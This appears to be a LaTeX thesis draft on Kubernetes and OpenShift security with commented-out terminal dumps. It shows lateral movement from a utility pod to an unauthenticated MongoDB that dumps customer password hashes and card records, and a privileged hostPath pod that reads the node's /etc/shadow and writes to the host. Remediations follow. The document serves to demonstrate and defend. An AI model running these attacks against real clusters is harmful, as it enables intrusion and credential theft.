2019-06-12T08:05:30.286+0000 I CONTROL  [initandlisten] **        We suggest setting it to 'never'
2019-06-12T08:05:30.286+0000 I CONTROL  [initandlisten]
2019-06-12T08:05:30.286+0000 I CONTROL  [initandlisten] ** WARNING: /sys/kernel/mm/transparent_hugepage/defrag is 'always'.
2019-06-12T08:05:30.286+0000 I CONTROL  [initandlisten] **        We suggest setting it to 'never'
2019-06-12T08:05:30.286+0000 I CONTROL  [initandlisten]
> show dbs
admin  0.000GB
local  0.000GB
users  0.000GB
> use users
switched to db users
> show collections
addresses
cards
customers
> db.cards.find()
{ "_id" : ObjectId("57a98d98e4b00679b4a830ae"), "longNum" : "5953580604169678", "expires" : "08/19", "ccv" : "678" }
{ "_id" : ObjectId("57a98d98e4b00679b4a830b1"), "longNum" : "5544154011345918", "expires" : "08/19", "ccv" : "958" }
{ "_id" : ObjectId("57a98d98e4b00679b4a830b4"), "longNum" : "0908415193175205", "expires" : "08/19", "ccv" : "280" }
{ "_id" : ObjectId("57a98ddce4b00679b4a830d2"), "longNum" : "5429804235432", "expires" : "04/16", "ccv" : "432" }
> db.customers.find()
{ "_id" : ObjectId("57a98d98e4b00679b4a830af"), "firstName" : "Eve", "lastName" : "Berger", "username" : "Eve_Berger", "password" : "fec51acb3365747fc61247da5e249674cf8463c2", "salt" : "c748112bc027878aa62812ba1ae00e40ad46d497", "addresses" : [ ObjectId("57a98d98e4b00679b4a830ad") ], "cards" : [ ObjectId("57a98d98e4b00679b4a830ae") ] }
{ "_id" : ObjectId("57a98d98e4b00679b4a830b2"), "firstName" : "User", "lastName" : "Name", "username" : "user", "password" : "e2de7202bb2201842d041f6de201b10438369fb8", "salt" : "6c1c6176e8b455ef37da13d953df971c249d0d8e", "addresses" : [ ObjectId("57a98d98e4b00679b4a830b0") ], "cards" : [ ObjectId("57a98d98e4b00679b4a830b1") ] }
{ "_id" : ObjectId("57a98d98e4b00679b4a830b5"), "firstName" : "User1", "lastName" : "Name1", "username" : "user1", "password" : "8f31df4dcc25694aeb0c212118ae37bbd6e47bcd", "salt" : "bd832b0e10c6882deabc5e8e60a37689e2b708c2", "addresses" : [ ObjectId("57a98d98e4b00679b4a830b3") ], "cards" : [ ObjectId("57a98d98e4b00679b4a830b4") ] }
> db.addresses.find()
{ "_id" : ObjectId("57a98d98e4b00679b4a830ad"), "number" : "246", "street" : "Whitelees Road", "city" : "Glasgow", "postcode" : "G67 3DL", "country" : "United Kingdom" }
{ "_id" : ObjectId("57a98d98e4b00679b4a830b0"), "number" : "246", "street" : "Whitelees Road", "city" : "Glasgow", "postcode" : "G67 3DL", "country" : "United Kingdom" }
{ "_id" : ObjectId("57a98d98e4b00679b4a830b3"), "number" : "4", "street" : "Maes-Y-Deri", "city" : "Aberdare", "postcode" : "CF44 6TF", "country" : "United Kingdom" }
{ "_id" : ObjectId("57a98ddce4b00679b4a830d1"), "number" : "3", "street" : "my road", "city" : "London", "country" : "UK" }
>
\end{lstlisting}
\fi
LATERAL MOVEMENT AKS COMMANDS

Display projects:
kubectl get namespace
Lookup service ip from server (look for user-db ip) :
kubectl get service -n sock-shop
Show container used: 
cat network-utils.yaml
Start container and enter it:
kubectl apply -f network-utils.yaml
kubectl exec -it network-utils -- /bin/bash

LATERAL MOVEMENT AKS SET STAGE DUMP
\iffalse
\begin{lstlisting}[
lukas@Azure:~$ kubectl get namespace
NAME          STATUS   AGE
default       Active   7h
kube-public   Active   7h
kube-system   Active   7h
sock-shop     Active   6h
testuser      Active   6h
lukas@Azure:~$ kubectl get service -n sock-shop
NAME           TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)        AGE
carts          ClusterIP   10.0.167.221   <none>        80/TCP         6h
carts-db       ClusterIP   10.0.199.172   <none>        27017/TCP      6h
catalogue      ClusterIP   10.0.133.141   <none>        80/TCP         6h
catalogue-db   ClusterIP   10.0.240.1     <none>        3306/TCP       6h
front-end      NodePort    10.0.246.241   <none>        80:30001/TCP   6h
orders         ClusterIP   10.0.16.21     <none>        80/TCP         6h
orders-db      ClusterIP   10.0.119.245   <none>        27017/TCP      6h
payment        ClusterIP   10.0.89.48     <none>        80/TCP         6h
queue-master   ClusterIP   10.0.64.13     <none>        80/TCP         6h
rabbitmq       ClusterIP   10.0.185.20    <none>        5672/TCP       6h
shipping       ClusterIP   10.0.117.16    <none>        80/TCP         6h
user           ClusterIP   10.0.69.17     <none>        80/TCP         6h
user-db        ClusterIP   10.0.1.75      <none>        27017/TCP      6h
lukas@Azure:~$ cat network-utils.yaml
apiVersion: v1
kind: Pod
metadata:
  name: network-utils
spec:
  containers:
    - name: network-utils
      image: amouat/network-utils
      command: [ "sh", "-c"]
      args:
        - while true; do
            sleep 10;
          done;
  restartPolicy: Neverlukas@Azure:~$
lukas@Azure:~$ kubectl apply -f network-utils.yaml
pod/network-utils created
lukas@Azure:~$ kubectl exec -it network-utils -- /bin/bash
root@network-utils:/#
\end{lstlisting}
\fi
LATERAL MOVEMENT COMMANDS AKS
\iffalse
Check availability from within container (in other project) <- TODO: not feasible with -Pn?!
nmap -p27017 --script mongodb-databases 172.30.2.17 -Pn
Download mongo binary, connect to db in container:
curl fastdl.mongodb.org/linux/mongodb-linux-x86_64-4.0.10.tgz -O
tar -xvf mongodb-linux-x86_64-4.0.10.tgz
./mongodb-linux-x86_64-4.0.10/bin/mongo 172.30.2.17
Search for interesting data:
show dbs
use users
show collections
db.customers.find()
db.addresses.find()
db.cards.find()
\fi
LATERAL MOVEMENT AKS TEXT
\iffalse
\begin{lstlisting}
root@network-utils:/# nmap -p27017 --script mongodb-databases 10.0.1.75 -Pn

Starting Nmap 6.47 ( http://nmap.org ) at 2019-06-17 15:36 UTC
Nmap scan report for user-db.sock-shop.svc.cluster.local (10.0.1.75)
Host is up (0.000071s latency).
PORT      STATE SERVICE
27017/tcp open  mongodb
| mongodb-databases:
|   databases
|     0
|       sizeOnDisk = 49152
|       name = admin
|       empty = false
|     1
|       sizeOnDisk = 65536
|       name = local
|       empty = false
|     2
|       sizeOnDisk = 114688
|       name = users
|       empty = false
|   ok = 1
|_  totalSize = 229376

Nmap done: 1 IP address (1 host up) scanned in 0.30 seconds
root@network-utils:/# curl fastdl.mongodb.org/linux/mongodb-linux-x86_64-4.0.10.tgz -O
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 81.0M  100 81.0M    0     0  20.6M      0  0:00:03  0:00:03 --:--:-- 20.6M
root@network-utils:/# tar -xvf mongodb-linux-x86_64-4.0.10.tgz
mongodb-linux-x86_64-4.0.10/THIRD-PARTY-NOTICES.gotools
mongodb-linux-x86_64-4.0.10/README
mongodb-linux-x86_64-4.0.10/THIRD-PARTY-NOTICES
mongodb-linux-x86_64-4.0.10/MPL-2
mongodb-linux-x86_64-4.0.10/LICENSE-Community.txt
mongodb-linux-x86_64-4.0.10/bin/mongodump
mongodb-linux-x86_64-4.0.10/bin/mongorestore
mongodb-linux-x86_64-4.0.10/bin/mongoexport
mongodb-linux-x86_64-4.0.10/bin/mongoimport
mongodb-linux-x86_64-4.0.10/bin/mongostat
mongodb-linux-x86_64-4.0.10/bin/mongotop
mongodb-linux-x86_64-4.0.10/bin/bsondump
mongodb-linux-x86_64-4.0.10/bin/mongofiles
mongodb-linux-x86_64-4.0.10/bin/mongoreplay
mongodb-linux-x86_64-4.0.10/bin/mongod
mongodb-linux-x86_64-4.0.10/bin/mongos
mongodb-linux-x86_64-4.0.10/bin/mongo
mongodb-linux-x86_64-4.0.10/bin/install_compass
root@network-utils:/# ./mongodb-linux-x86_64-4.0.10/bin/mongo 10.0.1.75
MongoDB shell version v4.0.10
connecting to: mongodb://10.0.1.75:27017/test?gssapiServiceName=mongodb
WARNING: No implicit session: Logical Sessions are only supported on server versions 3.6 and greater.
Implicit session: dummy session
MongoDB server version: 3.4.1
WARNING: shell and server versions do not match
Welcome to the MongoDB shell.
For interactive help, type "help".
For more comprehensive documentation, see
        http://docs.mongodb.org/
Questions? Try the support group
        http://groups.google.com/group/mongodb-user
Server has startup warnings:
2019-06-17T09:26:20.304+0000 I STORAGE  [initandlisten]
2019-06-17T09:26:20.304+0000 I STORAGE  [initandlisten] ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine
2019-06-17T09:26:20.304+0000 I STORAGE  [initandlisten] **          See http://dochub.mongodb.org/core/prodnotes-filesystem
2019-06-17T09:26:20.920+0000 I CONTROL  [initandlisten]
2019-06-17T09:26:20.920+0000 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.
2019-06-17T09:26:20.920+0000 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.
2019-06-17T09:26:20.920+0000 I CONTROL  [initandlisten]
2019-06-17T09:26:20.920+0000 I CONTROL  [initandlisten]
2019-06-17T09:26:20.920+0000 I CONTROL  [initandlisten] ** WARNING: /sys/kernel/mm/transparent_hugepage/enabled is 'always'.
2019-06-17T09:26:20.920+0000 I CONTROL  [initandlisten] **        We suggest setting it to 'never'
2019-06-17T09:26:20.920+0000 I CONTROL  [initandlisten]
> show dbs
admin  0.000GB
local  0.000GB
users  0.000GB
> use users
switched to db users
> db.customers.find()
{ "_id" : ObjectId("57a98d98e4b00679b4a830af"), "firstName" : "Eve", "lastName" : "Berger", "username" : "Eve_Berger", "password" : "fec51acb3365747fc61247da5e249674cf8463c2", "salt" : "c748112bc027878aa62812ba1ae00e40ad46d497", "addresses" : [ ObjectId("57a98d98e4b00679b4a830ad") ], "cards" : [ ObjectId("57a98d98e4b00679b4a830ae") ] }
{ "_id" : ObjectId("57a98d98e4b00679b4a830b2"), "firstName" : "User", "lastName" : "Name", "username" : "user", "password" : "e2de7202bb2201842d041f6de201b10438369fb8", "salt" : "6c1c6176e8b455ef37da13d953df971c249d0d8e", "addresses" : [ ObjectId("57a98d98e4b00679b4a830b0") ], "cards" : [ ObjectId("57a98d98e4b00679b4a830b1") ] }
{ "_id" : ObjectId("57a98d98e4b00679b4a830b5"), "firstName" : "User1", "lastName" : "Name1", "username" : "user1", "password" : "8f31df4dcc25694aeb0c212118ae37bbd6e47bcd", "salt" : "bd832b0e10c6882deabc5e8e60a37689e2b708c2", "addresses" : [ ObjectId("57a98d98e4b00679b4a830b3") ], "cards" : [ ObjectId("57a98d98e4b00679b4a830b4") ] }
> db.addresses.find()
{ "_id" : ObjectId("57a98d98e4b00679b4a830ad"), "number" : "246", "street" : "Whitelees Road", "city" : "Glasgow", "postcode" : "G67 3DL", "country" : "United Kingdom" }
{ "_id" : ObjectId("57a98d98e4b00679b4a830b0"), "number" : "246", "street" : "Whitelees Road", "city" : "Glasgow", "postcode" : "G67 3DL", "country" : "United Kingdom" }
{ "_id" : ObjectId("57a98d98e4b00679b4a830b3"), "number" : "4", "street" : "Maes-Y-Deri", "city" : "Aberdare", "postcode" : "CF44 6TF", "country" : "United Kingdom" }
{ "_id" : ObjectId("57a98ddce4b00679b4a830d1"), "number" : "3", "street" : "my road", "city" : "London", "country" : "UK" }
> db.cards.find()
{ "_id" : ObjectId("57a98d98e4b00679b4a830ae"), "longNum" : "5953580604169678", "expires" : "08/19", "ccv" : "678" }
{ "_id" : ObjectId("57a98d98e4b00679b4a830b1"), "longNum" : "5544154011345918", "expires" : "08/19", "ccv" : "958" }
{ "_id" : ObjectId("57a98d98e4b00679b4a830b4"), "longNum" : "0908415193175205", "expires" : "08/19", "ccv" : "280" }
{ "_id" : ObjectId("57a98ddce4b00679b4a830d2"), "longNum" : "5429804235432", "expires" : "04/16", "ccv" : "432" }
>
\end{lstlisting}
\fi
\subsection{Selecting security measures}

TODO use multitenant networkplugin (OCP) and network policies (k8s)


LATERAL MOVEMENT OCP REMEDIATION DUMP
\iffalse
\begin{lstlisting}[
[root@openshiftmaster ~]# oc projects
You have access to the following projects and can switch between them with 'oc project <projectname>':

    default
    kube-public
    kube-system
    management-infra
    openshift
    openshift-infra
    openshift-logging
    openshift-node
    openshift-sdn
    openshift-web-console
    other-team-deployment
    sock-shop
  * testuser

Using project "testuser" on server "https://openshiftmaster.lgr.com:8443".
[root@openshiftmaster ~]# oc adm pod-network isolate-projects sock-shop
[root@openshiftmaster ~]# oc rsh network-utils
# ./mongodb-linux-x86_64-4.0.10/bin/mongo 172.30.2.17
MongoDB shell version v4.0.10
connecting to: mongodb://172.30.2.17:27017/test?gssapiServiceName=mongodb
2019-06-14T14:31:15.634+0000 E QUERY    [js] Error: couldn't connect to server 172.30.2.17:27017, connection attempt failed: SocketException: Error connecting to 172.30.2.17:27017 :: caused by :: Connection timed out :
connect@src/mongo/shell/mongo.js:344:17
@(connect):2:6
exception: connect failed
#
\end{lstlisting}
\fi
LATERAL MOVEMENT AKS REMEDIATION COMMANDS

\iffalse
Mitigation needs CLUSTER REBUILD (needs advanced network config):
https://docs.microsoft.com/en-us/azure/aks/configure-azure-cni#configure-networking---portal
Create \& apply netpol:
cat sock-shop-ingress-netpol.yaml
kubectl apply -f sock-shop-ingress-netpol.yaml -n sock-shop
kubectl describe netpol -n sock-shop
Try again:
kubectl get service -n sock-shop
kubectl exec -it network-utils -- /bin/sh
./mongodb-linux-x86_64-4.0.10/bin/mongo 10.0.81.32
\fi

LATERAL MOVEMENT AKS REMEDIATION DUMP
\iffalse
\begin{lstlisting}[
lukas@Azure:~$ cat sock-shop-ingress-netpol.yaml
kind: NetworkPolicy
apiVersion: networking.k8s.io/v1
metadata:
  namespace: sock-shop
  name: sock-shop-ingress-netpol
spec:
  podSelector:
    matchLabels:
  ingress:
  - from:
    - podSelector: {}
lukas@Azure:~$ kubectl apply -f sock-shop-ingress-netpol.yaml -n sock-shop
networkpolicy.networking.k8s.io/sock-shop-ingress-netpol configured
lukas@Azure:~$ kubectl describe netpol -n sock-shop
Name:         sock-shop-ingress-netpol
Namespace:    sock-shop
Created on:   2019-06-18 12:00:09 +0000 UTC
Labels:       <none>
Annotations:  kubectl.kubernetes.io/last-applied-configuration:
                {"apiVersion":"networking.k8s.io/v1","kind":"NetworkPolicy","metadata":{"annotations":{},"name":"sock-shop-ingress-netpol","namespace":"so...
Spec:
  PodSelector:     <none> (Allowing the specific traffic to all pods in this namespace)
  Allowing ingress traffic:
    To Port: <any> (traffic allowed to all ports)
    From:
      PodSelector: <none>
  Allowing egress traffic:
    <none> (Selected pods are isolated for egress connectivity)
  Policy Types: Ingress
lukas@Azure:~$ kubectl get service -n sock-shop
NAME           TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)        AGE
carts          ClusterIP   10.0.144.225   <none>        80/TCP         29m
carts-db       ClusterIP   10.0.174.90    <none>        27017/TCP      29m
catalogue      ClusterIP   10.0.243.165   <none>        80/TCP         29m
catalogue-db   ClusterIP   10.0.60.122    <none>        3306/TCP       29m
front-end      NodePort    10.0.255.214   <none>        80:30001/TCP   29m
orders         ClusterIP   10.0.145.107   <none>        80/TCP         29m
orders-db      ClusterIP   10.0.217.238   <none>        27017/TCP      29m
payment        ClusterIP   10.0.91.69     <none>        80/TCP         29m
queue-master   ClusterIP   10.0.219.119   <none>        80/TCP         29m
rabbitmq       ClusterIP   10.0.202.131   <none>        5672/TCP       29m
shipping       ClusterIP   10.0.118.47    <none>        80/TCP         29m
user           ClusterIP   10.0.52.200    <none>        80/TCP         29m
user-db        ClusterIP   10.0.81.32     <none>        27017/TCP      29m
lukas@Azure:~$ kubectl exec -it network-utils -- /bin/sh
# ./mongodb-linux-x86_64-4.0.10/bin/mongo 10.0.81.32
MongoDB shell version v4.0.10
connecting to: mongodb://10.0.81.32:27017/test?gssapiServiceName=mongodb
2019-06-18T12:05:06.734+0000 E QUERY    [js] Error: couldn't connect to server 10.0.81.32:27017, connection attempt failed: SocketException: Error connecting to 10.0.81.32:27017 :: caused by :: Connection timedout :
connect@src/mongo/shell/mongo.js:344:17
@(connect):2:6
exception: connect failed
#
\end{lstlisting}
\fi
\subsection{Demonstration with implemented security measures}

TODO move pics, listings from above here

\subsection{Risk reassessment 1}

TODO updated table of risk for ocp AND aks

\section{Managing the risk of V08 - Container Breakout}
%TODO: write out all from ppt with commands, pictures
TODO this was done on AKS and OCP, but needed changes in default OCP settings to work.

\subsection{Demonstrating the successful attack without security measures}

BREAKOUT DEMO OCP COMMANDS
\iffalse
cat container_breakout.yaml

oc apply -f container_breakout.yaml

(wait until run through)

oc logs breakout

oc adm policy scc-review -z default -f container_breakout.yaml

oc adm policy remove-scc-from-user privileged -z default

oc adm policy scc-review -z default -f container_breakout.yaml

(to add again: )
oc adm policy add-scc-to-user privileged -z default
\fi
CONTAINER BREAKOUT OCP TEXT DUMP
\iffalse
\begin{lstlisting}[

[root@openshiftmaster ~]# cat container_breakout.yaml
apiVersion: v1
kind: Pod
metadata:
    name: breakout
spec:
    containers:
    - name: breakout
      securityContext:
        privileged: true
      image: alpine
      command: ["/bin/sh"]
      args: ["-c",
                'echo -e "        /etc/passwd of underlying node";
                cat /mnt/rootnode/etc/passwd;
                echo -e "-----------\n        /etc/shadow of underlying node";
                cat /mnt/rootnode/etc/shadow;
                echo -e "-----------\n        root directory of underlying node";
                ls -la /mnt/rootnode/;
                touch /mnt/rootnode/ALL_YOUR_NODES_ARE_BELONG_TO_US;
                echo -e "-----------\n        root directory of underlying node after manipulation through this container";
                ls -la /mnt/rootnode/;
                while true;
                  do sleep 30;
                done;'
        ]
      volumeMounts:
      - name: root-volume
        mountPath: /mnt/rootnode
    volumes:
    - name: root-volume
      hostPath:
        path: /
[root@openshiftmaster ~]# oc apply -f container_breakout.yaml
pod/breakout created
[root@openshiftmaster ~]# oc logs breakout
        /etc/passwd of underlying node
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
lgr:x:1000:1000:lgr:/home/lgr:/bin/bash
ntp:x:38:38::/etc/ntp:/sbin/nologin
dockerroot:x:998:995:Docker User:/var/lib/docker:/sbin/nologin
openshiftinstall:x:1001:1001::/home/openshiftinstall:/bin/bash
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
gluster:x:997:994:GlusterFS daemons:/run/gluster:/sbin/nologin
-----------
        /etc/shadow of underlying node
root:$6$Psl5jPOS6J4iml1A$YZqVpcvzWBUz6x.h.YQ3PGw7SZ2jkYkln4hRSLE4NYkD2qdupVHTxKDZGfKm9mQQ59aMdtk2cwCctw4wr1Ue41::0:99999:7:::
bin:*:17492:0:99999:7:::
daemon:*:17492:0:99999:7:::
adm:*:17492:0:99999:7:::
lp:*:17492:0:99999:7:::
sync:*:17492:0:99999:7:::
shutdown:*:17492:0:99999:7:::
halt:*:17492:0:99999:7:::
mail:*:17492:0:99999:7:::
operator:*:17492:0:99999:7:::
games:*:17492:0:99999:7:::
ftp:*:17492:0:99999:7:::
nobody:*:17492:0:99999:7:::
systemd-network:!!:18032::::::
dbus:!!:18032::::::
polkitd:!!:18032::::::
sshd:!!:18032::::::
postfix:!!:18032::::::
lgr:$6$XIdEJyuVesw/j.wx$zwfe31D3HKwM8Iz9wkuuMqEGJLuBtnk547QnLuyJ3zS3gDGX2sAsn4xooDR5fSIbSctd81QFRpa5jZDMHlr4C.::0:99999:7:::
ntp:!!:18033::::::
dockerroot:!!:18033::::::
openshiftinstall:$6$SiTDcnpB$y4qzzbyDeBYkG/1VM9Rdj2fTHcFaDItqtBS5uzSrVj0NBA1SFExCu1dO8aXLZgSpfMpOkqhFXNL8CaUDG8Fch1:18036:0:99999:7:::
rpc:!!:18036:0:99999:7:::
rpcuser:!!:18036::::::
nfsnobody:!!:18036::::::
gluster:!!:18036::::::
-----------
        root directory of underlying node
total 32
dr-xr-xr-x   17 root     root           236 Jun 13 14:34 .
drwxr-xr-x    3 root     root            22 Jun 13 14:35 ..
lrwxrwxrwx    1 root     root             7 May 16 14:59 bin -> usr/bin
dr-xr-xr-x    4 root     root          4096 Jun 11 14:55 boot
drwxr-xr-x   21 root     root          4160 Jun 13 14:35 dev
drwxr-xr-x  103 root     root          8192 Jun 11 14:59 etc
drwxr-xr-x    4 root     root            41 May 20 07:34 home
-rw-r--r--    1 root     root          4868 May 16 15:15 less
lrwxrwxrwx    1 root     root             7 May 16 14:59 lib -> usr/lib
lrwxrwxrwx    1 root     root             9 May 16 14:59 lib64 -> usr/lib64
drwxr-xr-x    2 root     root             6 Dec 14  2017 media
drwxr-xr-x    2 root     root             6 Dec 14  2017 mnt
drwxr-xr-x    3 root     root            17 May 21 07:42 opt
dr-xr-xr-x  728 root     root             0 Jun 11 14:54 proc
dr-xr-x---   11 root     root          4096 Jun  7 12:38 root
drwxr-xr-x   37 root     root          1200 Jun 13 11:52 run
lrwxrwxrwx    1 root     root             8 May 16 14:59 sbin -> usr/sbin
drwxr-xr-x    2 root     root             6 Dec 14  2017 srv
dr-xr-xr-x   13 root     root             0 Jun 11 14:54 sys
drwxrwxrwt   14 root     root          4096 Jun 13 14:34 tmp
drwxr-xr-x   13 root     root           155 May 16 14:59 usr
drwxr-xr-x   20 root     root           282 May 20 08:00 var
-----------
        root directory of underlying node after manipulation through this container
total 32
dr-xr-xr-x   17 root     root           275 Jun 13 14:35 .
drwxr-xr-x    3 root     root            22 Jun 13 14:35 ..
-rw-r--r--    1 root     root             0 Jun 13 14:35 ALL_YOUR_NODES_ARE_BELONG_TO_US
lrwxrwxrwx    1 root     root             7 May 16 14:59 bin -> usr/bin
dr-xr-xr-x    4 root     root          4096 Jun 11 14:55 boot
drwxr-xr-x   21 root     root          4160 Jun 13 14:35 dev
drwxr-xr-x  103 root     root          8192 Jun 11 14:59 etc
drwxr-xr-x    4 root     root            41 May 20 07:34 home
-rw-r--r--    1 root     root          4868 May 16 15:15 less
lrwxrwxrwx    1 root     root             7 May 16 14:59 lib -> usr/lib
lrwxrwxrwx    1 root     root             9 May 16 14:59 lib64 -> usr/lib64
drwxr-xr-x    2 root     root             6 Dec 14  2017 media
drwxr-xr-x    2 root     root             6 Dec 14  2017 mnt
drwxr-xr-x    3 root     root            17 May 21 07:42 opt
dr-xr-xr-x  728 root     root             0 Jun 11 14:54 proc
dr-xr-x---   11 root     root          4096 Jun  7 12:38 root
drwxr-xr-x   37 root     root          1200 Jun 13 11:52 run
lrwxrwxrwx    1 root     root             8 May 16 14:59 sbin -> usr/sbin
drwxr-xr-x    2 root     root             6 Dec 14  2017 srv
dr-xr-xr-x   13 root     root             0 Jun 11 14:54 sys
drwxrwxrwt   14 root     root          4096 Jun 13 14:34 tmp
drwxr-xr-x   13 root     root           155 May 16 14:59 usr
drwxr-xr-x   20 root     root           282 May 20 08:00 var
\end{lstlisting}
\fi
CONTAINER BREAKOUT OCP RESULT DUMP
\iffalse
\begin{lstlisting}[
[root@openshiftworker ~]# ls -la /
total 32
dr-xr-xr-x.  17 root root  275 Jun 13 16:35 .
dr-xr-xr-x.  17 root root  275 Jun 13 16:35 ..
-rw-r--r--.   1 root root    0 Jun 13 16:35 ALL_YOUR_NODES_ARE_BELONG_TO_US
lrwxrwxrwx.   1 root root    7 May 16 16:59 bin -> usr/bin
dr-xr-xr-x.   4 root root 4096 Jun 11 16:55 boot
drwxr-xr-x.  21 root root 4160 Jun 13 16:35 dev
drwxr-xr-x. 103 root root 8192 Jun 11 16:59 etc
drwxr-xr-x.   4 root root   41 May 20 09:34 home
-rw-r--r--.   1 root root 4868 May 16 17:15 less
lrwxrwxrwx.   1 root root    7 May 16 16:59 lib -> usr/lib
lrwxrwxrwx.   1 root root    9 May 16 16:59 lib64 -> usr/lib64
drwxr-xr-x.   2 root root    6 Dec 14  2017 media
drwxr-xr-x.   2 root root    6 Dec 14  2017 mnt
drwxr-xr-x.   3 root root   17 May 21 09:42 opt
dr-xr-xr-x. 727 root root    0 Jun 11 16:54 proc
dr-xr-x---.  11 root root 4096 Jun  7 14:38 root
drwxr-xr-x.  37 root root 1200 Jun 13 13:52 run
lrwxrwxrwx.   1 root root    8 May 16 16:59 sbin -> usr/sbin
drwxr-xr-x.   2 root root    6 Dec 14  2017 srv
dr-xr-xr-x.  13 root root    0 Jun 11 16:54 sys
drwxrwxrwt.  14 root root 4096 Jun 13 16:34 tmp
drwxr-xr-x.  13 root root  155 May 16 16:59 usr
drwxr-xr-x.  20 root root  282 May 20 10:00 var
\end{lstlisting}
\fi
CONTAINER BREAKOUT AKS PREPARATION - SSH TO NODE
\iffalse
\begin{lstlisting}[
CLUSTER_RESOURCE_GROUP=$(az aks show --resource-group kubernetes-ba-test --name demo-cluster-LGR --query nodeResourceGroup -o tsv)
az vm list-ip-addresses --resource-group $CLUSTER_RESOURCE_GROUP -o table
kubectl run -it --rm aks-ssh --image=debian
apt-get update && apt-get install openssh-client –y
(other shell) 
kubectl get pods
kubectl cp ~/.ssh/id_rsa [POD_NAME_HERE]:/id_rsa
chmod 0600 id_rsa
ssh -i id_rsa azureuser@[NODE_IP_HERE]
\end{lstlisting}
\fi
CONTAINER BREAKOUT AKS COMMANDS
\iffalse
cat container_breakout.yaml

kubectl apply -f container_breakout.yaml

(wait until run through)

kubectl logs breakout
\fi
CONTAINER BREAKOUT AKS TEXT DUMP
\iffalse
\begin{lstlisting}[
lukas@Azure:~$ cat container_breakout.yaml
apiVersion: v1
kind: Pod
metadata:
    name: breakout
spec:
    containers:
    - name: breakout
      securityContext:
        privileged: true
      image: alpine
      command: ["/bin/sh"]
      args: ["-c",
                'echo -e "        /etc/passwd of underlying node";
                cat /mnt/rootnode/etc/passwd;
                echo -e "-----------\n        /etc/shadow of underlying node";
                cat /mnt/rootnode/etc/shadow;
                echo -e "-----------\n        root directory of underlying node";
                ls -la /mnt/rootnode/;
                touch /mnt/rootnode/ALL_YOUR_NODES_ARE_BELONG_TO_US;
                echo -e "-----------\n        root directory of underlying node after manipulation through this container";
                ls -la /mnt/rootnode/;
                while true;
                  do sleep 30;
                done;'
        ]
      volumeMounts:
      - name: root-volume
        mountPath: /mnt/rootnode
    volumes:
    - name: root-volume
      hostPath:
        path: /
lukas@Azure:~$ kubectl apply -f container_breakout.yaml
pod/breakout created
lukas@Azure:~$ kubectl logs breakout
        /etc/passwd of underlying node
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
unscd:x:112:116::/var/lib/unscd:/bin/false
statd:x:113:65534::/var/lib/nfs:/bin/false
ceph:x:64045:64045:Ceph storage service:/var/lib/ceph:/bin/false
azureuser:x:1001:1001:Ubuntu:/home/azureuser:/bin/bash
-----------
        /etc/shadow of underlying node
root:$6$w9SIk+c=$7K7HDrrDDXXK.ybne04PZ2coDScUlQv4Vx6YkscDlhKkka5YWMmUEoPiTsmarCssQr1CCm2NqLzdKaaIXrI04/:18039:0:99999:7:::
daemon:*:18030:0:99999:7:::
bin:*:18030:0:99999:7:::
sys:*:18030:0:99999:7:::
sync:*:18030:0:99999:7:::
games:*:18030:0:99999:7:::
man:*:18030:0:99999:7:::
